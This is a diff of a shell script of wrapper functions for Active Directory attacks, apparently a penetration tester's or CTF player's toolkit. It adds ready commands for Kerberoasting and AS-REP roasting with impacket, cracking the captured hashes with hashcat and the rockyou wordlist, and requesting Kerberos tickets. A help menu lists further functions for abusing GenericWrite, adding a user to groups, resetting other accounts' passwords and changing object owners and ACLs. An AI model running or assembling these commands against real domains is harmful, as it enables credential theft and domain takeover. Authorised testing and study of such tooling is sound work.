@@ -7,7 +7,7 @@ krbo() {
         return 1
     fi
     rdate -n "$1"
-    python3 targetedKerberoast.py -v -d "$2" -u "$3" -p "$4"
+    python3 /opt/targetedKerberoast/targetedKerberoast.py -v -d "$2" -u "$3" -p "$4"
 }
 
 asrep() {
@@ -17,7 +17,8 @@ asrep() {
         return 1
     fi
     rdate -n "$1"
-    impacket-GetNPUsers -usersfile users.txt -request -format hashcat -outputfile asrep -dc-ip "$1" "$2/"
+    impacket-GetNPUsers -usersfile users -request -format hashcat -outputfile asrep -dc-ip "$1" "$2/"
+    hashcat asrep /usr/share/wordlists/rockyou.txt
 }
 
 krbnum() {
@@ -121,4 +122,24 @@ tgt() {
     fi
     impacket-getTGT -dc-ip "$1" "$2/$3:$4"
     export KRB5CCNAME=./"$3".ccache
+    kinit
+}
+
+aahelp() {
+    echo "[+] all functions:"
+    echo
+    echo "  exploit kerberoasting               - krbo <ip> <domain> <user> <pass>"
+    echo "  exploit as-rep roasting             - asrep <ip> <domain>"
+    echo "  enum users with kerbrute            - krbnum <ip> <domain>"
+    echo "  smb client interactive              - smbc <domain> <user> <pass> <target-ip>"
+    echo "  bloodhound ldap dump                - ldapdump <user> <pass> <domain> <ip>"
+    echo "  network scan with nmap              - map <ip>"
+    echo "  exploit kerberoasting (alternate)   - wspn <domain> <user> <pass>"
+    echo "  exploit genericwrite                - gw <user> <domain> <pass> <target> <ip>"
+    echo "  add self to group                   - addself <ip> <domain> <user> <pass> <group> <user>"
+    echo "  change password (gall)              - gall <ip> <domain> <user> <pass/hash> <target> <newpass>"
+    echo "  change password (chpwd)             - cpwd <ip> <domain> <user> <pass/hash> <target> <newpass>"
+    echo "  change owner and acl permissions    - chowner <new-owner> <target> <domain> <user> <pass> <ip> <domain> <user> <pass/hash> <target> <newpass>"
+    echo "  get ticket granting ticket (tgt)    - tgt <ip> <domain> <user> <pass>"
+    echo "  show this help menu                 - aahelp"
 }
